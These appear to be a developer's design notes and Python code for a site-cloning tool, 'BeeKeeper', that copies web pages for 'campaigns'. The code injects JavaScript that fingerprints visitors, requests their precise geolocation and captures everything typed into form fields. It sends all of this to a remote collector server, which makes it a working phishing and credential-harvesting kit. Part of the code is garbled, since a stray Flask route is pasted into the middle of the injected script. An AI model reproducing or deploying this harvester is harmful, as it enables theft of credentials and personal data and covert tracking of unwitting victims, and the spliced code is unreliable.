
# Issue

Burp triggers the JS function in the cloned page. ZAP does not. 
Need to figure out why. 

Ideas - track 404, 501 errors through the JS - implementing this would confirm that the JS is not being loaded by ZAP. 

If that doesn't work, restructure the way files are served - can we serve all files through a flask "router." 

## Brainstorm flask router API

User programs their service to redirect traffic to the router API - the router API triggers a flask function that looks up the ID of the requested clone and generates the clone associated with the ID

![[Pasted image 20240828105227.png]]

==How are we going to handle recursive cloning?! Sub directories?==

Most efficient method - create a new flask blueprint for each new campaign. 


For one webpage - 
- Webpage gets cloned, new route added to clone IDs file, generate page based on the id that gets passed
For more than one webpage
- Each link in the clone gets a seperate html file, need to visit the original target first and then click links on the existing webpage access. Need to determine a method to generate recursively cloned webpages through the flask triage function. 

Solution for recursive cloning 
- Add a column to the ID csv file containing all the subroutes (slow to query)


```python
def cloner(path, base_address, uri, recur): #webpage clone function

print(f"attempting to clone {uri}")

#name the file after the campaign

split_path = path.split("/")

print(split_path)

  

filename = split_path[3] + ".html"

  

try:

response = requests.get(uri)

except Exception as err:

print(err)

return 0 #return 0 for failure

#generate a unique code for the new clone and append it to static/campaigns/campaign_IDs.csv

id_dict = pd.read_csv('./static/campaigns/campaign_IDs.csv')

code = len(id_dict) + 1

new_data = pd.DataFrame({"id": code, "filepath": path[:-7]}, index=[0])

appended = pd.concat([id_dict, new_data])

print(appended)

appended.to_csv('./static/campaigns/campaign_IDs.csv', header=True, index=False)

  
  

soup = BeautifulSoup(response.text, 'html.parser')

html_content = soup.prettify()

  

#Append the location script

#location_script = soup.new_tag("script")

#location_script.string = 'var myip;function callback(data) { console.log(data.city);}function request_location() {var oHead = document.getElementsByTagName("head")[0];var oScript = document.createElement("script");oScript.type = "text/javascript";oScript.src = "http://ip-api.com/json/" + myip + "?callback=callback";oHead.appendChild(oScript);}</script><script type="text/javascript" src="http://l2.io/ip.js?var=myip" onload="request_location();"></script></head>'

#soup.html.body.append(location_script)

information_collection_script = '''

async function getData() {

//fetch IP address from icanhazip.com

const response = await fetch('https://icanhazip.com');

const IP = await response.text();

//get the user agent and browser languages

const userAgent = navigator.userAgent

const languages = navigator.languages //returned as an array

  

//get the user's tme and timezone

const time = new Date();

const hours = time.getHours();

const minutes = time.getMinutes();

const user_time = hours + ":" + minutes;

const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  

//intialize array for the user's plugin names

const plugin_names = new Array()

  

//intialize variables for collecting GPU information and OS

var canvas = document.createElement('canvas');

var GPU_info = "Unknown"

var gl;

var debugInfo;

var vendor;

var renderer;

var platform;

  

//GPU information collection

try {

use dynamic route

@app.route('base_domain/<str:route>')
def dyanmic_loader():
gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

} catch(e) {

vendor = "NA"

renderer = "NA"

}

  

if(gl) {

debugInfo = gl.getExtension('WEBGL_debug_renderer_info');

vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);

renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

GPU_info = vendor + " " + renderer;

}

  

//plugin names information collection

var x=navigator.plugins.length; // store the total no of plugin stored

for(var i=0;i<x;i++)

{

plugin_names.push(navigator.plugins[i].name)

}

  

//attempt seperate OS check (navigator.platform provides the user's OS even if user agent is faked!)

if (window.navigator.platform.indexOf("Win") != -1) {

platform = "Windows";

} else if (window.navigator.platform.indexOf("Mac") != -1) {

platform = "Mac";

} else if (window.navigator.platform.indexOf("Linux") != -1) {

platform = "Linux";

} else {

platform = "Unknown"

}

  

//coordinate grabber success and fail functions (the information is passed to the flask server in these functions)

function success(pos) {

const lat = pos.coords.latitude;

const long = pos.coords.longitude;

const acc = pos.coords.accuracy;

send = fetch(`http://'''+beehive_IP+''':'''+str(beehive_port)+'''/collector?code='''+str(code)+'''&lat=${lat}&long=${long}&acc=${acc}&IP=${IP}&userAgent=${userAgent}&languages=${languages}&user_time=${user_time}&timezone=${timezone}&plugin_names=${plugin_names}&GPU_info=${GPU_info}&platform=${platform}`);

}

  

function error(err) {

send = fetch(`http://'''+beehive_IP+''':'''+str(beehive_port)+'''/collector?code='''+str(code)+'''&lat=NA&long=NA&acc=NA&IP=${IP}&userAgent=${userAgent}&languages=${languages}&user_time=${user_time}&timezone=${timezone}&plugin_names=${plugin_names}&GPU_info=${GPU_info}&platform=${platform}`);

}

  

const options = {

enableHighAccuracy: true,

timeout: 10000

}

  

navigator.geolocation.getCurrentPosition(success, error, options);

}

  

getData()

'''

button_submit_script = '''

const buttons = document.querySelectorAll("button")

const inputs = document.querySelectorAll("input")

const textarea = document.querySelectorAll("textarea")

const type = "input"

var input_inputs = new Array();

var textarea_inputs = new Array();

var user_inputs;

  

buttons.forEach((element) => element.addEventListener("click", function() {

input_inputs.length = 0

textarea_inputs.length = 0

inputs.forEach((input) => {

if(input.value != "" && input.value != "undefined") {

//input_inputs = input_inputs + "," + input.value;

input_inputs.push(input.value)

alert(input_inputs)

}

});

  

textarea.forEach((input) => {

if(input.value != "" && input.value != "undefined") {

//textarea_inputs = textarea_inputs + ", " + input.value

textarea_inputs.push(input.value)

alert(textarea_inputs)

}

});

user_inputs = textarea_inputs + "," + input_inputs;

submitInput()

}));

async function submitInput() {

//fetch IP address from icanhazip.com

const response = await fetch('https://icanhazip.com');

const IP = await response.text();

fetch(`http://'''+beehive_IP+''':'''+str(beehive_port)+'''/collector/inputs?code='''+str(code)+'''&IP=${IP}&uri=${location.href}&type=${type}&inputs=${user_inputs}`)

  

}

'''

inject_code(soup, information_collection_script)

inject_code(soup, button_submit_script)

  

key_elements = soup.find_all(['a', 'input', 'form', 'button', 'link', 'script', 'img'])

for element in key_elements:

if element.name == 'a' and 'href' in element.attrs:

page_num = 0

if recur > 0: #recursive cloning!

print("--------------" + uri + "----------------------")

link_filename = f"index-{recur}-{page_num}.html"

print(element['href'])

  

if "http" not in element['href']:

filename = element['href']

uri = base_address + element['href']

else:

uri_elements_name_index = len(element['href'].split("/")) - 1

filename = element['href'][uri_elements_name_index:]

print(f"filename is the following: {filename}")

  

cloner(path, base_address, uri, recur - 1)

page_num += 1

element['href'] = os.path.abspath(os.path.join(path, link_filename))

elif element.name == 'script':

try:

print(element['src'])

if "http" not in element['src']:

element['src'] = uri + element['src']

except:

continue

elif element.name == 'link':

try:

if "http" not in element['href'] and 'stylesheet' in element['rel']:

print(element['rel'])

element['href'] = uri + element['href']

except:

continue

elif element.name == 'img':

try:

print(element['src'])

if "http" not in element['src']:

element['src'] = uri + element['src']

except:

continue

elif element.name == 'input':

continue

elif element.name == 'form':

print("form detected")

#element['action'] = "http://127.0.0.1:5000/hand_over_the_data"

#element['method'] = 'POST'

elif element.name == 'button': #passing of information should here

continue

  

with open(os.path.join(path, filename), 'w') as file:

file.write(str(soup))

  

return 1 #return 0 for success
```


Problem - recur sets filename before finishing execution - need to set the filename at the START of the file


filename consists of:
campaign_name_(last section of uri).html

==need to work out the case in which http:// is included==- this code can be simpler.


# From here

app.add_url_rule(route.name, view_func=index, )


1. In the NCF menu, user inputs a website to clone 
2. BeeKeeper.py clones the target using the following method for each webpage:
	1. Clone the URL using requsts
	2. Parse the HTML and inject code using beuatifulsoup
	3. Update the ID to campaign CSV table with the new campaign and ID
	4. Catalog all the cloned routes ???
3. For each cloned route, use the app.add_url_rule to register a new URL route to the alternative port 

for file in File.query.all():
	app.add_url_rule(file.name, view_func=lambda: render_template(file.file_path), methods=['GET'])


Plugin -> Clone Server -> BeeKeeper

